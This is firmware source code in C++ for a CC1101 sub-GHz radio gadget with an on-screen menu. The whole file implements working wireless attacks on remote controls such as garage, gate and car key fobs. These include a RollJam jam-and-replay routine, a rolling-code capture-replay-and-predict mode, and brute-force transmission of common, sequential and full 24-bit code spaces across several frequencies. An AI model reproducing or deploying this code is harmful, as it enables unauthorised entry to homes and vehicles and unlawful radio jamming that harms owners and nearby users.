#include "config.h"

namespace {
  uint32_t deBruijnCode = 0;
  int deBruijnBits = 16;
  int smartPhase = 0;
  int smartIndex = 0;
}

void rollJamAttackStep() {
  if (!cc1101::rolljamActive) return;
  uint32_t freq = BRUTE_FREQS[cc1101::bfFreqIndex];
  
  switch (cc1101::rolljamStep) {
    case 0:
      ELECHOUSE_cc1101.setSidle();
      ELECHOUSE_cc1101.setMHZ(freq / 1000.0);
      ELECHOUSE_cc1101.SetRx();
      delay(5);
      { 
        byte rssiRaw = ELECHOUSE_cc1101.getRssi();
        int rssi = (rssiRaw >= 128) ? (rssiRaw - 256) / 2 - 74 : rssiRaw / 2 - 74;
        if (rssi > -70) { 
          startCapture(freq);
          delay(250);
          stopCapture();
          DecodedSignal decoded = decodeCapturedSignal();
          if (decoded.valid) {
            cc1101::rolljamCode1 = decoded.code;
            cc1101::rolljamProtocol1 = decoded.protocolIndex;
            cc1101::rolljamBits1 = decoded.bits;
            cc1101::rolljamHasCode1 = true;
          } else {
            cc1101::rolljamHasCode1 = false;
          }
          cc1101::rolljamStep = 1; 
          cc1101::rolljamTimer = millis(); 
        }
      }
      break;
    case 1:
      jamChannel(freq);
      if (millis() - cc1101::rolljamTimer > 400) {
        cc1101::rolljamStep = 2;
        cc1101::rolljamTimer = millis();
      }
      break;
    case 2:
      ELECHOUSE_cc1101.setSidle();
      ELECHOUSE_cc1101.setMHZ(freq / 1000.0);
      ELECHOUSE_cc1101.SetRx();
      delay(5);
      { 
        byte rssiRaw = ELECHOUSE_cc1101.getRssi();
        int rssi = (rssiRaw >= 128) ? (rssiRaw - 256) / 2 - 74 : rssiRaw / 2 - 74;
        if (rssi > -70) { 
          startCapture(freq);
          delay(250);
          stopCapture();
          DecodedSignal decoded = decodeCapturedSignal();
          if (decoded.valid) {
            cc1101::rolljamCode2 = decoded.code;
            cc1101::rolljamProtocol2 = decoded.protocolIndex;
            cc1101::rolljamBits2 = decoded.bits;
            cc1101::rolljamHasCode2 = true;
          } else {
            cc1101::rolljamHasCode2 = false;
          }
          cc1101::rolljamStep = 3; 
          cc1101::rolljamTimer = millis(); 
        }
        if (millis() - cc1101::rolljamTimer > 12000) cc1101::rolljamStep = 0;
      }
      break;
    case 3:
      jamChannel(freq);
      if (millis() - cc1101::rolljamTimer > 400) {
        cc1101::rolljamStep = 4;
        cc1101::rolljamTimer = millis();
      }
      break;
    case 4:
      if (cc1101::rolljamHasCode1) {
        ELECHOUSE_cc1101.setSidle();
        ELECHOUSE_cc1101.setMHZ(freq / 1000.0);
        ELECHOUSE_cc1101.setModulation(0);
        ELECHOUSE_cc1101.setPA(12);
        ELECHOUSE_cc1101.SetTx();
        delay(5);
        pinMode(CC_GDO0, OUTPUT);
        const RCSwitchProtocol& p = protocols[cc1101::rolljamProtocol1];
        transmitCode(cc1101::rolljamCode1, cc1101::rolljamBits1, p);
        delayMicroseconds(10000);
        digitalWrite(CC_GDO0, LOW);
        ELECHOUSE_cc1101.setSidle();
      }
      cc1101::rolljamStep = 5;
      break;
    case 5:
      break;
  }
}

void rollingPwnAttackStep() {
  if (!cc1101::rollingPwnActive) return;
  uint32_t freq = BRUTE_FREQS[cc1101::bfFreqIndex];
  
  switch (cc1101::rollingPwnStep) {
    case 0:
      ELECHOUSE_cc1101.setSidle();
      ELECHOUSE_cc1101.setMHZ(freq / 1000.0);
      ELECHOUSE_cc1101.SetRx();
      delay(5);
      { 
        byte rssiRaw = ELECHOUSE_cc1101.getRssi();
        int rssi = (rssiRaw >= 128) ? (rssiRaw - 256) / 2 - 74 : rssiRaw / 2 - 74;
        if (rssi > -70 && cc1101::capturedCodeCount < 10) {
          startCapture(freq);
          delay(250);
          stopCapture();
          DecodedSignal decoded = decodeCapturedSignal();
          if (decoded.valid) {
            bool isNew = true;
            if (cc1101::capturedCodeCount > 0 && 
                cc1101::capturedCodes[cc1101::capturedCodeCount - 1] == decoded.code) {
              isNew = false;
            }
            if (isNew) {
              cc1101::capturedCodes[cc1101::capturedCodeCount] = decoded.code;
              cc1101::capturedProtocols[cc1101::capturedCodeCount] = decoded.protocolIndex;
              cc1101::capturedBits[cc1101::capturedCodeCount] = decoded.bits;
              cc1101::capturedCodeCount++;
              cc1101::rollingPwnTimer = millis();
            }
          }
        }
        if (cc1101::capturedCodeCount >= 3 || millis() - cc1101::rollingPwnTimer > 15000) {
          if (cc1101::capturedCodeCount >= 2) { 
            cc1101::rollingPwnStep = 1; 
            cc1101::rollingPwnCounter = 0;
            int32_t diff1 = (int32_t)cc1101::capturedCodes[1] - (int32_t)cc1101::capturedCodes[0];
            int32_t diff2 = (cc1101::capturedCodeCount > 2) ? 
                           (int32_t)cc1101::capturedCodes[2] - (int32_t)cc1101::capturedCodes[1] : diff1;
            if (diff1 == diff2 && diff1 != 0) {
              cc1101::rollingPwnPattern = diff1;
              cc1101::rollingPwnPatternType = 0;
            } else {
              cc1101::rollingPwnPatternType = 1;
            }
          } else { 
            cc1101::capturedCodeCount = 0; 
            cc1101::rollingPwnTimer = millis(); 
          }
        }
      }
      break;
    case 1:
      {
        ELECHOUSE_cc1101.setSidle();
        ELECHOUSE_cc1101.setMHZ(freq / 1000.0);
        ELECHOUSE_cc1101.setModulation(0);
        ELECHOUSE_cc1101.setPA(12);
        ELECHOUSE_cc1101.SetTx();
        delay(5);
        pinMode(CC_GDO0, OUTPUT);
        
        for (int i = 0; i < cc1101::capturedCodeCount; i++) {
          int pIdx = cc1101::capturedProtocols[i];
          if (pIdx >= 0 && pIdx < NUM_PROTOCOLS) {
            transmitCode(cc1101::capturedCodes[i], cc1101::capturedBits[i], protocols[pIdx]);
            delayMicroseconds(5000);
          }
        }
        
        if (cc1101::capturedCodeCount > 0 && cc1101::rollingPwnPatternType == 0) {
          uint32_t lastCode = cc1101::capturedCodes[cc1101::capturedCodeCount - 1];
          int lastProto = cc1101::capturedProtocols[cc1101::capturedCodeCount - 1];
          int lastBits = cc1101::capturedBits[cc1101::capturedCodeCount - 1];
          for (int i = 0; i < 20; i++) {
            uint32_t predicted = lastCode + (cc1101::rollingPwnPattern * (i + 1));
            if (lastProto >= 0 && lastProto < NUM_PROTOCOLS) {
              transmitCode(predicted, lastBits, protocols[lastProto]);
              delayMicroseconds(3000);
            }
          }
        }
        
        digitalWrite(CC_GDO0, LOW);
        ELECHOUSE_cc1101.setSidle();
        cc1101::rollingPwnStep = 2;
        cc1101::rollingPwnTimer = millis();
      }
      break;
    case 2:
      if (millis() - cc1101::rollingPwnTimer > 2000) {
        cc1101::rollingPwnCounter++;
        if (cc1101::rollingPwnCounter > 5) cc1101::rollingPwnStep = 3;
        else cc1101::rollingPwnStep = 1;
      }
      break;
    case 3:
      break;
  }
}

void cc1101BruteForceLoop() {
  if (buttonPressed(BTN_BACK)) {
    cc1101::bfState = cc1101::BF_IDLE;
    cc1101::rolljamActive = false;
    cc1101::rollingPwnActive = false;
    digitalWrite(CC_GDO0, LOW);
    ELECHOUSE_cc1101.setSidle();
    current_screen = 0;
    drawMenu();
    delay(200);
    return;
  }
  
  if (buttonPressed(BTN_SELECT)) {
    if (cc1101::bfState == cc1101::BF_IDLE || cc1101::bfState == cc1101::BF_PAUSED) {
      cc1101::bfState = cc1101::BF_RUNNING;
      cc1101::bfStartTime = millis();
      cc1101::bfCodesSent = 0;
      cc1101::bfCode = 0;
      smartPhase = 0;
      smartIndex = 0;
      deBruijnCode = 0;
      
      if (cc1101::bfMode == cc1101::BF_MODE_ROLLJAM) {
        cc1101::rolljamActive = true;
        cc1101::rolljamStep = 0;
        cc1101::rolljamHasCode1 = false;
        cc1101::rolljamHasCode2 = false;
      } else if (cc1101::bfMode == cc1101::BF_MODE_ROLLINGPWN) {
        cc1101::rollingPwnActive = true;
        cc1101::rollingPwnStep = 0;
        cc1101::capturedCodeCount = 0;
      } else {
        ELECHOUSE_cc1101.setSidle();
        ELECHOUSE_cc1101.setMHZ(BRUTE_FREQS[cc1101::bfFreqIndex] / 1000.0);
        ELECHOUSE_cc1101.setModulation(0);
        ELECHOUSE_cc1101.setPA(12);
        ELECHOUSE_cc1101.SetTx();
        delay(5);
        pinMode(CC_GDO0, OUTPUT);
        digitalWrite(CC_GDO0, LOW);
      }
    } else {
      cc1101::bfState = cc1101::BF_PAUSED;
      cc1101::rolljamActive = false;
      cc1101::rollingPwnActive = false;
      digitalWrite(CC_GDO0, LOW);
      ELECHOUSE_cc1101.setSidle();
    }
    delay(200);
  }
  
  if (buttonPressed(BTN_UP) && cc1101::bfState != cc1101::BF_RUNNING) {
    if (cc1101::bfMode == cc1101::BF_MODE_COMMON) cc1101::bfMode = cc1101::BF_MODE_DEBRUIJN;
    else if (cc1101::bfMode == cc1101::BF_MODE_DEBRUIJN) cc1101::bfMode = cc1101::BF_MODE_FULL;
    else if (cc1101::bfMode == cc1101::BF_MODE_FULL) cc1101::bfMode = cc1101::BF_MODE_SMART;
    else if (cc1101::bfMode == cc1101::BF_MODE_SMART) cc1101::bfMode = cc1101::BF_MODE_ROLLJAM;
    else if (cc1101::bfMode == cc1101::BF_MODE_ROLLJAM) cc1101::bfMode = cc1101::BF_MODE_ROLLINGPWN;
    else cc1101::bfMode = cc1101::BF_MODE_COMMON;
    delay(150);
  }
  
  if (buttonPressed(BTN_DOWN) && cc1101::bfState != cc1101::BF_RUNNING) {
    cc1101::bfFreqIndex = (cc1101::bfFreqIndex + 1) % NUM_BRUTE_FREQS;
    delay(150);
  }
  
  int totalCodes = 0;
  switch (cc1101::bfMode) {
    case cc1101::BF_MODE_COMMON: totalCodes = NUM_COMMON_CODES; break;
    case cc1101::BF_MODE_DEBRUIJN: totalCodes = (1 << deBruijnBits); break;
    case cc1101::BF_MODE_FULL: totalCodes = 0x1000000; break;
    case cc1101::BF_MODE_SMART: totalCodes = SUBGHZ_DB_COUNT + NUM_COMMON_CODES + (1 << deBruijnBits) + 0x1000000; break;
    case cc1101::BF_MODE_ROLLJAM: totalCodes = 6; break;
    case cc1101::BF_MODE_ROLLINGPWN: totalCodes = 4; break;
  }
  
  int etaSeconds = 0;
  if (cc1101::bfState == cc1101::BF_RUNNING && cc1101::bfCodesSent > 0) {
    unsigned long elapsed = (millis() - cc1101::bfStartTime) / 1000;
    if (elapsed > 0) {
      float rate = (float)cc1101::bfCodesSent / elapsed;
      int remaining = totalCodes - cc1101::bfCodesSent;
      etaSeconds = (rate > 0) ? remaining / rate : 0;
    }
  }
  
  u8g2.clearBuffer();
  drawFunctionHeader("CC1101 BruteForce");
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.setCursor(0, 22);
  if (cc1101::bfState == cc1101::BF_RUNNING) u8g2.print("Status: ATIVO");
  else if (cc1101::bfState == cc1101::BF_PAUSED) u8g2.print("Status: PAUSADO");
  else u8g2.print("Status: PARADO");
  
  u8g2.setCursor(0, 32);
  u8g2.print("Modo: ");
  switch (cc1101::bfMode) {
    case cc1101::BF_MODE_COMMON: u8g2.print("COMUM"); break;
    case cc1101::BF_MODE_DEBRUIJN: u8g2.print("DEBRUIJN"); break;
    case cc1101::BF_MODE_FULL: u8g2.print("FULL"); break;
    case cc1101::BF_MODE_ROLLJAM: u8g2.print("ROLLJAM"); break;
    case cc1101::BF_MODE_ROLLINGPWN: u8g2.print("ROLLING-PWN"); break;
    case cc1101::BF_MODE_SMART: u8g2.print("SMART"); break;
  }
  
  u8g2.setCursor(0, 42);
  u8g2.print("Freq: ");
  u8g2.print(BRUTE_FREQS[cc1101::bfFreqIndex] / 1000.0, 2);
  u8g2.print(" MHz");
  
  if (cc1101::bfMode == cc1101::BF_MODE_ROLLJAM && cc1101::rolljamActive) {
    u8g2.setCursor(0, 52);
    u8g2.print("Step: ");
    u8g2.print(cc1101::rolljamStep);
    u8g2.print(" C1:");
    u8g2.print(cc1101::rolljamHasCode1 ? "OK" : "--");
  } else if (cc1101::bfMode == cc1101::BF_MODE_ROLLINGPWN && cc1101::rollingPwnActive) {
    u8g2.setCursor(0, 52);
    u8g2.print("Step: ");
    u8g2.print(cc1101::rollingPwnStep);
    u8g2.print(" Cap:");
    u8g2.print(cc1101::capturedCodeCount);
  } else {
    u8g2.setCursor(0, 52);
    u8g2.print("Cod: ");
    u8g2.print(cc1101::bfCodesSent);
    u8g2.print("/");
    if (totalCodes > 100000) {
      u8g2.print(totalCodes / 1000);
      u8g2.print("k");
    } else {
      u8g2.print(totalCodes);
    }
  }
  
  u8g2.setCursor(0, 62);
  if (cc1101::bfState == cc1101::BF_RUNNING && etaSeconds > 0) {
    u8g2.print("ETA: ");
    if (etaSeconds > 3600) {
      u8g2.print(etaSeconds / 3600);
      u8g2.print("h");
    } else if (etaSeconds > 60) {
      u8g2.print(etaSeconds / 60);
      u8g2.print("m");
    } else {
      u8g2.print(etaSeconds);
      u8g2.print("s");
    }
  } else {
    u8g2.print("SEL:Iniciar UP:Modo");
  }
  u8g2.sendBuffer();
  
  if (cc1101::bfState == cc1101::BF_RUNNING) {
    if (cc1101::bfMode == cc1101::BF_MODE_ROLLJAM) {
      rollJamAttackStep();
    }
    else if (cc1101::bfMode == cc1101::BF_MODE_ROLLINGPWN) {
      rollingPwnAttackStep();
    }
    else {
      const RCSwitchProtocol& p = protocols[cc1101::bfProtocolIndex];
      
      if (cc1101::bfMode == cc1101::BF_MODE_COMMON) {
        if (cc1101::bfCode < NUM_COMMON_CODES) {
          transmitCode(COMMON_CODES[cc1101::bfCode], 24, p);
          delayMicroseconds(5000);
          cc1101::bfCode++;
          cc1101::bfCodesSent++;
        } else {
          cc1101::bfCode = 0;
          cc1101::bfProtocolIndex = (cc1101::bfProtocolIndex + 1) % NUM_PROTOCOLS;
          if (cc1101::bfProtocolIndex == 0) {
            cc1101::bfFreqIndex = (cc1101::bfFreqIndex + 1) % NUM_BRUTE_FREQS;
            ELECHOUSE_cc1101.setMHZ(BRUTE_FREQS[cc1101::bfFreqIndex] / 1000.0);
            ELECHOUSE_cc1101.SetTx();
            delay(5);
          }
        }
      }
      else if (cc1101::bfMode == cc1101::BF_MODE_DEBRUIJN) {
        if (deBruijnCode < (1u << deBruijnBits)) {
          transmitCode(deBruijnCode, deBruijnBits, p);
          delayMicroseconds(3000);
          deBruijnCode++;
          cc1101::bfCodesSent++;
          if (deBruijnCode % 1000 == 0) {
            cc1101::bfProtocolIndex = (cc1101::bfProtocolIndex + 1) % NUM_PROTOCOLS;
          }
        } else {
          deBruijnCode = 0;
          cc1101::bfFreqIndex = (cc1101::bfFreqIndex + 1) % NUM_BRUTE_FREQS;
          ELECHOUSE_cc1101.setMHZ(BRUTE_FREQS[cc1101::bfFreqIndex] / 1000.0);
          ELECHOUSE_cc1101.SetTx();
          delay(5);
        }
      }
      else if (cc1101::bfMode == cc1101::BF_MODE_FULL) {
        if (cc1101::bfCode < 0x1000000) {
          transmitCode(cc1101::bfCode, 24, p);
          delayMicroseconds(2000);
          cc1101::bfCode++;
          cc1101::bfCodesSent++;
        } else {
          cc1101::bfCode = 0;
          cc1101::bfProtocolIndex = (cc1101::bfProtocolIndex + 1) % NUM_PROTOCOLS;
          if (cc1101::bfProtocolIndex == 0) {
            cc1101::bfFreqIndex = (cc1101::bfFreqIndex + 1) % NUM_BRUTE_FREQS;
            ELECHOUSE_cc1101.setMHZ(BRUTE_FREQS[cc1101::bfFreqIndex] / 1000.0);
            ELECHOUSE_cc1101.SetTx();
            delay(5);
          }
        }
      }
      else if (cc1101::bfMode == cc1101::BF_MODE_SMART) {
        if (smartPhase == 0) {
          if (smartIndex < SUBGHZ_DB_COUNT) {
            const SubGHzEntry& entry = subGHzDatabase[smartIndex];
            ELECHOUSE_cc1101.setMHZ(entry.frequency);
            ELECHOUSE_cc1101.SetTx();
            delay(5);
            const RCSwitchProtocol& proto = protocols[entry.protocolIndex];
            transmitCode(entry.code, entry.bits, proto);
            delayMicroseconds(5000);
            smartIndex++;
            cc1101::bfCodesSent++;
          } else {
            smartPhase = 1;
            smartIndex = 0;
            ELECHOUSE_cc1101.setMHZ(BRUTE_FREQS[cc1101::bfFreqIndex] / 1000.0);
            ELECHOUSE_cc1101.SetTx();
            delay(5);
          }
        }
        else if (smartPhase == 1) {
          if (smartIndex < NUM_COMMON_CODES) {
            transmitCode(COMMON_CODES[smartIndex], 24, p);
            delayMicroseconds(5000);
            smartIndex++;
            cc1101::bfCodesSent++;
          } else {
            smartPhase = 2;
            smartIndex = 0;
            deBruijnCode = 0;
          }
        }
        else if (smartPhase == 2) {
          if (deBruijnCode < (1u << deBruijnBits)) {
            transmitCode(deBruijnCode, deBruijnBits, p);
            delayMicroseconds(3000);
            deBruijnCode++;
            cc1101::bfCodesSent++;
            if (deBruijnCode % 1000 == 0) {
              cc1101::bfProtocolIndex = (cc1101::bfProtocolIndex + 1) % NUM_PROTOCOLS;
            }
          } else {
            smartPhase = 3;
            cc1101::bfCode = 0;
          }
        }
        else if (smartPhase == 3) {
          if (cc1101::bfCode < 0x1000000) {
            transmitCode(cc1101::bfCode, 24, p);
            delayMicroseconds(2000);
            cc1101::bfCode++;
            cc1101::bfCodesSent++;
          } else {
            cc1101::bfCode = 0;
            cc1101::bfProtocolIndex = (cc1101::bfProtocolIndex + 1) % NUM_PROTOCOLS;
            if (cc1101::bfProtocolIndex == 0) {
              cc1101::bfFreqIndex = (cc1101::bfFreqIndex + 1) % NUM_BRUTE_FREQS;
              ELECHOUSE_cc1101.setMHZ(BRUTE_FREQS[cc1101::bfFreqIndex] / 1000.0);
              ELECHOUSE_cc1101.SetTx();
              delay(5);
            }
          }
        }
      }
    }
  }
}

void cc1101BruteForceSetup() {
  cc1101::bfState = cc1101::BF_IDLE;
  cc1101::bfFreqIndex = 0;
  cc1101::bfProtocolIndex = 0;
  cc1101::bfCode = 0;
  cc1101::bfCodesSent = 0;
  cc1101::rolljamActive = false;
  cc1101::rollingPwnActive = false;
  cc1101::rolljamStep = 0;
  cc1101::rolljamHasCode1 = false;
  cc1101::rolljamHasCode2 = false;
  cc1101::rollingPwnStep = 0;
  cc1101::capturedCodeCount = 0;
  smartPhase = 0;
  smartIndex = 0;
  deBruijnCode = 0;
  u8g2.clearBuffer();
  drawFunctionHeader("CC1101 BruteForce");
  u8g2.setFont(u8g2_font_6x10_tr);
  u8g2.setCursor(0, 24);
  u8g2.print("SEL: Iniciar/Parar");
  u8g2.setCursor(0, 34);
  u8g2.print("UP: Prox. Modo");
  u8g2.setCursor(0, 44);
  u8g2.print("DOWN: Prox. Freq");
  u8g2.setCursor(0, 54);
  u8g2.print("SMART:DB>Com>DBJ>Full");
  u8g2.setCursor(0, 62);
  u8g2.print("BACK: Menu");
  u8g2.sendBuffer();
}
